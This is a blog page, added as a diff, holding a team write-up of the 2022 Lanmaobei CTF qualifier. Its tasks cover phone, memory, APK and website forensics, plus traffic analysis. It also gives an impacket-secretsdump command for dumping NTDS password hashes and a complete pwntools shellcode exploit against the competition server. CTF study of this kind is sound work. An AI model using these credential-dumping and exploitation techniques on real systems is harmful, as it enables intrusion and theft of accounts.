@@ -1,0 +1,822 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="-ctf," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="mrl64's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言 和取证斗智斗勇了一天，做的头疼，懒得再单独搞wp了，直接放团队的了。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【蓝帽杯2022初赛】团队write up">
+<meta property="og:url" content="http://example.com/2022/07/09/%E3%80%90%E8%93%9D%E5%B8%BD%E6%9D%AF2022%E5%88%9D%E8%B5%9B%E3%80%91%E5%9B%A2%E9%98%9Fwrite-up/index.html">
+<meta property="og:site_name" content="mrl64&#39;s Blog">
+<meta property="og:description" content="前言 和取证斗智斗勇了一天，做的头疼，懒得再单独搞wp了，直接放团队的了。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s2.loli.net/2022/07/09/lbEKRjh32mcMLV8.png">
+<meta property="og:image" content="https://s2.loli.net/2022/07/09/NUJF36sEKuIXpeM.png">
+<meta property="og:image" content="https://s2.loli.net/2022/07/09/FYmRd7Nb4t8lcwU.png">
+<meta property="og:image" content="https://s2.loli.net/2022/07/09/omPAItX5pBZTVQ7.png">
+<meta property="og:image" content="https://s2.loli.net/2022/07/09/YhBHscF5l8zfZ7w.png">
+<meta property="og:image" content="https://s2.loli.net/2022/07/09/zB45JuxQPm27LFo.png">
+<meta property="og:image" content="https://s2.loli.net/2022/07/09/qWwczKSm8Mox6VZ.png">
+<meta property="og:image" content="https://s2.loli.net/2022/07/09/VCn74EQ2SzmATPh.png">
+<meta property="og:image" content="https://s2.loli.net/2022/07/09/oeQfP4CzL3dSlcG.png">
+<meta property="og:image" content="https://s2.loli.net/2022/07/09/28gSWl3JcqeIY7f.png">
+<meta property="og:image" content="https://s2.loli.net/2022/07/09/7bhGlnF6t8IfA2k.png">
+<meta property="og:image" content="https://s2.loli.net/2022/07/09/R6MOTJ8CFnQSd41.png">
+<meta property="og:image" content="https://s2.loli.net/2022/07/09/haZUm3ELixAPndz.png">
+<meta property="og:image" content="https://s2.loli.net/2022/07/09/rVNsA1dRaYBpzI7.png">
+<meta property="og:image" content="https://s2.loli.net/2022/07/09/pkjVd7rtqofHD2P.png">
+<meta property="og:image" content="https://s2.loli.net/2022/07/09/OeGzgwLSm4BH6YU.png">
+<meta property="og:image" content="https://s2.loli.net/2022/07/09/HXr8REfZhlJQLsV.png">
+<meta property="og:image" content="https://s2.loli.net/2022/07/09/oieRTaXwbvM53JZ.png">
+<meta property="og:image" content="https://s2.loli.net/2022/07/09/ZcPAGnqJIY5w6LS.png">
+<meta property="article:published_time" content="2022-07-09T14:08:40.000Z">
+<meta property="article:modified_time" content="2022-07-09T14:24:56.992Z">
+<meta property="article:author" content="liszt_lin">
+<meta property="article:tag" content="-ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/07/09/lbEKRjh32mcMLV8.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2022/07/09/【蓝帽杯2022初赛】团队write-up/"/>
+
+
+
+
+
+  <title>【蓝帽杯2022初赛】团队write up | mrl64's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">mrl64's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/09/%E3%80%90%E8%93%9D%E5%B8%BD%E6%9D%AF2022%E5%88%9D%E8%B5%9B%E3%80%91%E5%9B%A2%E9%98%9Fwrite-up/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mrl64's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">【蓝帽杯2022初赛】团队write up</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-07-09T22:08:40+08:00">
+                2022-07-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/write-up/" itemprop="url" rel="index">
+                    <span itemprop="name">write up</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>和取证斗智斗勇了一天，做的头疼，懒得再单独搞wp了，直接放团队的了。</p>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="电子取证"><a href="#电子取证" class="headerlink" title="电子取证"></a>电子取证</h1><h2 id="手机取证-1"><a href="#手机取证-1" class="headerlink" title="手机取证_1"></a>手机取证_1</h2><p>打开exe后直接搜索627604C2-C586-48C1-AA16-FF33C3022159.PNG，找到图片文件并导出，获取图片分辨率<br><img src="https://s2.loli.net/2022/07/09/lbEKRjh32mcMLV8.png"></p>
+<p>flag值：<br>360x360</p>
+<h2 id="手机取证-2"><a href="#手机取证-2" class="headerlink" title="手机取证_2"></a>手机取证_2</h2><p>搜索 姜总 查看微信群组中的聊天记录即可找到快递单号<br><img src="https://s2.loli.net/2022/07/09/NUJF36sEKuIXpeM.png"></p>
+<p>flag值：<br>SF1142358694796</p>
+<h2 id="计算机取证-1"><a href="#计算机取证-1" class="headerlink" title="计算机取证_1"></a>计算机取证_1</h2><p>直接kit工具一把梭，得到密码<br><img src="https://s2.loli.net/2022/07/09/FYmRd7Nb4t8lcwU.png"></p>
+<p>flag值：<br>anxinqi</p>
+<h2 id="计算机取证-2"><a href="#计算机取证-2" class="headerlink" title="计算机取证_2"></a>计算机取证_2</h2><p>使用命令<code>volatility -f 1.dmp --profile=Win7SP1x64 cmdline</code><br>查看1.dmp的cmdline，发现MagnetRAMCaptu文件以及PID值<br><img src="https://s2.loli.net/2022/07/09/omPAItX5pBZTVQ7.png"></p>
+<p>flag值：<br>2192</p>
+<h2 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析_1"></a>程序分析_1</h2><p>使用aapt反编译AndroidManifest.xml文件，找到程序包名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cmd：aapt.exe dump xmltree EXEC.apk AndroidManifest.xml</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/07/09/YhBHscF5l8zfZ7w.png"></p>
+<p>flag值：<br>exec.azj.kny.d.c</p>
+<h2 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析_2"></a>程序分析_2</h2><p>同样使用aapt查看程序状态，找到入口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cmd：aapt.exe dump badging EXEC.apk</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/07/09/zB45JuxQPm27LFo.png"></p>
+<p>flag值：<br>minmtta.hemjcbm.ahibyws.MainActivity</p>
+<h2 id="程序分析-3"><a href="#程序分析-3" class="headerlink" title="程序分析_3"></a>程序分析_3</h2><p>Jeb反编译文件，找到入口的MainActivity，发现加密字符串，即为本程序的服务器地址的密文：<br><img src="https://s2.loli.net/2022/07/09/qWwczKSm8Mox6VZ.png"></p>
+<p>flag值：<br>aHR0cHM6Ly9hbnNqay5lY3hlaW8ueHl6</p>
+<h2 id="程序分析-4"><a href="#程序分析-4" class="headerlink" title="程序分析_4"></a>程序分析_4</h2><p>用jeb打开，逐个查看源码，找到一处疑似检测环境的，类名为a<br><img src="https://s2.loli.net/2022/07/09/VCn74EQ2SzmATPh.png"><br><img src="https://s2.loli.net/2022/07/09/oeQfP4CzL3dSlcG.png"></p>
+<p>flag值：<br>a</p>
+<h2 id="网站取证-1"><a href="#网站取证-1" class="headerlink" title="网站取证_1"></a>网站取证_1</h2><p>木马肯定都是在敏感文件夹中，直接找upload之类的文件夹，发现里面没有东西，那就去找temp文件夹，最后在<br>\www\runtime\temp\0f71e181346d43e56722aec663e5d4e9.php<br>找到木马的密码<br><img src="https://s2.loli.net/2022/07/09/28gSWl3JcqeIY7f.png"></p>
+<p>flag值：<br>lanmaobei666</p>
+<h2 id="网站取证-2"><a href="#网站取证-2" class="headerlink" title="网站取证_2"></a>网站取证_2</h2><p>找数据库密码首先找database.php文件，这个文件在<br>\www\application\database.php<br>接下来打开后发现这样几行代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include (&quot;encrypt/encrypt.php&quot;);</span><br><span class="line">&#x27;password&#x27;        =&gt; my_encrypt()</span><br></pre></td></tr></table></figure>
+<p>那么我们跟进到encrypto.php中，发现加密函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function my_encrypt()&#123;</span><br><span class="line">    $str = &#x27;P3LMJ4uCbkFJ/RarywrCvA==&#x27;;</span><br><span class="line">    $str = str_replace(array(&quot;/r/n&quot;, &quot;/r&quot;, &quot;/n&quot;), &quot;&quot;, $str);</span><br><span class="line">    $key = &#x27;PanGuShi&#x27;;</span><br><span class="line">    $iv = substr(sha1($key),0,16);</span><br><span class="line">    $td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,&quot;&quot;,MCRYPT_MODE_CBC,&quot;&quot;);</span><br><span class="line">    mcrypt_generic_init($td, &quot;PanGuShi&quot;, $iv);</span><br><span class="line">    $decode = base64_decode($str);</span><br><span class="line">    $dencrypted = mdecrypt_generic($td, $decode);</span><br><span class="line">    mcrypt_generic_deinit($td);</span><br><span class="line">    mcrypt_module_close($td);</span><br><span class="line">    $dencrypted = trim($dencrypted);</span><br><span class="line">    return $dencrypted;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>阅读发现是AES加密，str和key都给了，iv是key的sha1的前16位，那么我们在线解密，得到数据库密码:<br><img src="https://s2.loli.net/2022/07/09/7bhGlnF6t8IfA2k.png"></p>
+<p>flag值：<br>KBLT123</p>
+<h2 id="网站取证-3"><a href="#网站取证-3" class="headerlink" title="网站取证_3"></a>网站取证_3</h2><p>看了眼bak.sql文件发现转账记录存在tab_channel_order_list中，我就按这个名字去搜文件，然后就找到了这个文件<br>\www\application\admin\model\Channelorderlist.php<br>Salt文件的就在函数中<br><img src="https://s2.loli.net/2022/07/09/R6MOTJ8CFnQSd41.png"></p>
+<p>flag值：<br>jyzg123456</p>
+<h2 id="网站取证-4"><a href="#网站取证-4" class="headerlink" title="网站取证_4"></a>网站取证_4</h2><p>既然直接给了解密函数就可以直接得到GG币的金额，转账金额×当天汇率的总和就是总金额了。要注意转账人和收款人的id，是id为3的向id为5的转账。这些数据在bak.sql都可以找到并对应上。<br>由于我太菜了，不会写脚本一次到位，因此直接手算了，下面是解密单个加密值的脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$key = &#x27;jyzg123456&#x27;;</span><br><span class="line">$data = &#x27;mplslWps&#x27;;</span><br><span class="line">$key = md5($key);</span><br><span class="line">$x = 0;</span><br><span class="line">$data = base64_decode($data);</span><br><span class="line">$len = mb_strlen($data);</span><br><span class="line">$l = mb_strlen($key);</span><br><span class="line">$char = &#x27;&#x27;;</span><br><span class="line">$str = &#x27;&#x27;;</span><br><span class="line">for ($i = 0; $i &lt; $len; $i++) &#123;</span><br><span class="line">    if ($x == $l) &#123;</span><br><span class="line">        $x = 0;</span><br><span class="line">    &#125;</span><br><span class="line">    $char .= mb_substr($key, $x, 1);</span><br><span class="line">    $x++;</span><br><span class="line">&#125;</span><br><span class="line">for ($i = 0; $i &lt; $len; $i++) &#123;</span><br><span class="line">    if (ord(mb_substr($data, $i, 1)) &lt; ord(mb_substr($char, $i, 1))) &#123;</span><br><span class="line">        $str .= chr((ord(mb_substr($data, $i, 1)) + 256) - ord(mb_substr($char, $i, 1)));</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $str .= chr(ord(mb_substr($data, $i, 1)) - ord(mb_substr($char, $i, 1)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo $str;</span><br></pre></td></tr></table></figure>
+
+<p>flag值：<br>15758353.76</p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="domainhacker"><a href="#domainhacker" class="headerlink" title="domainhacker"></a>domainhacker</h2><p>分析流量操作大概是：把数据打包成rar，移动rar，get的经典域渗透操作，解密base64找到密码：SecretsPassw0rds<br><img src="https://s2.loli.net/2022/07/09/haZUm3ELixAPndz.png"></p>
+<p>提取压缩包，打开后发现是mimikazt，直接找到hash值提交即可</p>
+<p>flag值：<br>flag{416f89c3a5deb1d398a1a1fce93862a7}</p>
+<h2 id="domainhacker2"><a href="#domainhacker2" class="headerlink" title="domainhacker2"></a>domainhacker2</h2><p>分析流量操作大概依旧是：把需要的数据打包成rar，移动rar，get的经典域渗透操作，解密base64找到密码FakePassword123$<br><img src="https://s2.loli.net/2022/07/09/rVNsA1dRaYBpzI7.png"></p>
+<p>发现ntds.dit文件，使用指令提取ntds历史记录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -system /home/kali/桌面/1122/SYSTEM -security /home/kali/桌面/1122/SECURITY -ntds /home/kali/桌面/1122/ntds.dit LOCAL -history </span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/07/09/pkjVd7rtqofHD2P.png"></p>
+<p>flag值：<br>flag{07ab403ab740c1540c378b0f5aaa4087}</p>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="EscapeShellcode"><a href="#EscapeShellcode" class="headerlink" title="EscapeShellcode"></a>EscapeShellcode</h2><p>首先程序开启了沙箱，禁用了除了read和write以外的功能：<br><img src="https://s2.loli.net/2022/07/09/OeGzgwLSm4BH6YU.png"></p>
+<p>pre_shellcode的功能是将一堆寄存器置0xdeadbeefdeadbeef：<br><img src="https://s2.loli.net/2022/07/09/HXr8REfZhlJQLsV.png"></p>
+<p>但是肯定不会将rip破坏。因此rip的值就是切入点。<br>由于是在堆上执行，所以rip指向的内容就是堆中的地址，根据这个地址可以计算出堆的基地址。<br>然后测试时用sys_write打印堆中的所有内容，发现存在有libseccomp.so映射入内存中的地址，利用这个地址可以计算出与libc的偏移，从而可以控制rsi指向libc的基地址。由于不同版本的偏移量不一样，经过测试，最终确定靶机使用的是U18.04，libc-2.27。<br>发现environ中有_start的地址：<br><img src="https://s2.loli.net/2022/07/09/oieRTaXwbvM53JZ.png"></p>
+<p>通过计算可以控制rsi指向environ，再指向_start。<br>这样再通过计算偏移量就可以使得rsi指向flag的地址，最终利用sys_write就可以打印出flag了：<br><img src="https://s2.loli.net/2022/07/09/ZcPAGnqJIY5w6LS.png"></p>
+<p>exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">#io=process(&#x27;./escape_shellcode&#x27;)</span><br><span class="line">io=remote(&#x27;39.106.154.121&#x27;,27654)</span><br><span class="line"></span><br><span class="line">shellcode=&#x27;&#x27;&#x27;</span><br><span class="line">endbr64</span><br><span class="line">lea rsi, [rip]</span><br><span class="line">mov rsp, rsi</span><br><span class="line">add rsp, 0x1000</span><br><span class="line">mov rdi, 1</span><br><span class="line">and si, 0xf000</span><br><span class="line">add rsi, 0x12d0</span><br><span class="line">mov rsi, [rsi]</span><br><span class="line">sub rsi, 0x60fca0</span><br><span class="line">add rsi, 0x3ee098</span><br><span class="line">mov rsi, [rsi]</span><br><span class="line">sub rsi, 0xb8</span><br><span class="line">mov rsi, [rsi]</span><br><span class="line">sub rsi, 0x11a0</span><br><span class="line">add rsi, 0x4120</span><br><span class="line">mov rdx, 0x200</span><br><span class="line">mov rax, 1</span><br><span class="line">syscall</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcode)</span><br><span class="line">#print(len(shellcode))</span><br><span class="line"></span><br><span class="line">#gdb.attach(io)</span><br><span class="line">io.send(shellcode)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>flag值：<br>flag{c08bbe2a-3378-4789-b146-d29947b1424b}</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># -ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/07/08/buu%E7%BB%83%E4%B9%A010/" rel="next" title="buu练习10">
+                <i class="fa fa-chevron-left"></i> buu练习10
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">78</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81"><span class="nav-number"></span> <span class="nav-text">电子取证</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%8B%E6%9C%BA%E5%8F%96%E8%AF%81-1"><span class="nav-number">1.</span> <span class="nav-text">手机取证_1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%8B%E6%9C%BA%E5%8F%96%E8%AF%81-2"><span class="nav-number">2.</span> <span class="nav-text">手机取证_2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8F%96%E8%AF%81-1"><span class="nav-number">3.</span> <span class="nav-text">计算机取证_1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8F%96%E8%AF%81-2"><span class="nav-number">4.</span> <span class="nav-text">计算机取证_2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90-1"><span class="nav-number">5.</span> <span class="nav-text">程序分析_1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90-2"><span class="nav-number">6.</span> <span class="nav-text">程序分析_2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90-3"><span class="nav-number">7.</span> <span class="nav-text">程序分析_3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90-4"><span class="nav-number">8.</span> <span class="nav-text">程序分析_4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E7%AB%99%E5%8F%96%E8%AF%81-1"><span class="nav-number">9.</span> <span class="nav-text">网站取证_1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E7%AB%99%E5%8F%96%E8%AF%81-2"><span class="nav-number">10.</span> <span class="nav-text">网站取证_2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E7%AB%99%E5%8F%96%E8%AF%81-3"><span class="nav-number">11.</span> <span class="nav-text">网站取证_3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E7%AB%99%E5%8F%96%E8%AF%81-4"><span class="nav-number">12.</span> <span class="nav-text">网站取证_4</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number"></span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#domainhacker"><span class="nav-number">1.</span> <span class="nav-text">domainhacker</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#domainhacker2"><span class="nav-number">2.</span> <span class="nav-text">domainhacker2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PWN"><span class="nav-number"></span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#EscapeShellcode"><span class="nav-number">1.</span> <span class="nav-text">EscapeShellcode</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
